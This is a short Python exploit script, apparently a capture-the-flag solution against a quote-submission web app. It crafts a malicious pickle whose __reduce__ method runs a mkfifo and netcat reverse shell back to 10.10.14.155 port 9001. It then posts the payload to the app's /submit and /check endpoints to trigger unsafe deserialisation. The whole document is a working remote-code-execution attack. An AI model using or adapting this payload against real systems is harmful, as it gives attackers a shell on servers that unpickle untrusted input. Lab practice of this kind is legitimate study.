import requests, os, base64, cPickle
from hashlib import md5

class PickleExploit(object):
    def __reduce__(self):
        return (os.system, ('echo homer!;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.155 9001 >/tmp/f',))

# Pickling the class "PickleExploit()".
sc = cPickle.dumps(PickleExploit())
char, quote = sc.split("!")
p_id = md5(char + quote).hexdigest()

# Sending requests based off of the code in /simpsons/__init__.py
requests.post('http://10.129.107.169/submit', data={'character':char, 'quote': quote})
requests.post('http://10.129.107.169/check', data={'id': p_id})
